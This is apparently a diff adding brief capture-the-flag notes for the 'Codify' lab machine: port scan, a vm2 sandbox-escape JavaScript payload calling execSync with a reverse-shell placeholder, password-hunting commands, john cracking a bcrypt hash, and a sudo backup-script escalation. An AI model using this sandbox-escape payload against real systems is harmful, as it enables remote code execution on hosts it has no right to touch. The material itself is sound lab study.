@@ -1,0 +1,62 @@
+> nmap codify.htb -p-             
+
+	Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 11:25 CET
+	Nmap scan report for codify.htb (10.10.11.239)
+	Host is up (0.092s latency).
+	Not shown: 65531 closed tcp ports (conn-refused)
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	80/tcp   open  http
+	3000/tcp open  ppp
+	8080/tcp open  http-proxy
+
+	Nmap done: 1 IP address (1 host up) scanned in 33.90 seconds
+
+> vm2 exploit with payload :
+	async function fn() {
+	    (function stack() {
+		new Error().stack;
+		stack();
+	    })();
+	}
+	p = fn();
+	p.constructor = {
+	    [Symbol.species]: class FakePromise {
+		constructor(executor) {
+		    executor(
+			(x) => x,
+			(err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('REVSHELL'); }
+		    )
+		}
+	    }
+	};
+	p.then();
+
+> copy ssh key to authorized_keys
+> search for joshua password with :
+	grep -Ra joshua / 2> /dev/null
+	strings /var/www/contact/tickets.db
+
+> john pass.txt
+	Using default input encoding: UTF-8
+	Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+	Cost 1 (iteration count) is 4096 for all loaded hashes
+	Will run 32 OpenMP threads
+	Proceeding with single, rules:Single
+	Press 'q' or Ctrl-C to abort, almost any other key for status
+	Almost done: Processing the remaining buffered candidate passwords, if any.
+	Proceeding with wordlist:/usr/share/john/password.lst
+	spongebob1       (?)     
+	1g 0:00:00:34 DONE 2/3 (2023-11-05 21:48) 0.02923g/s 353.6p/s 353.6c/s 353.6C/s steph1..undertaker1
+	Use the "--show" option to display all of the cracked passwords reliably
+	Session completed. 
+
+> copy ssh key to authorized_keys
+> sudo -l
+	Matching Defaults entries for joshua on codify:
+	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+	User joshua may run the following commands on codify:
+	    (root) /opt/scripts/mysql-backup.sh
+> exploit unquoted string comparison in mysql-backup.sh with wildcard to leak root password
+> use root_pswd.py
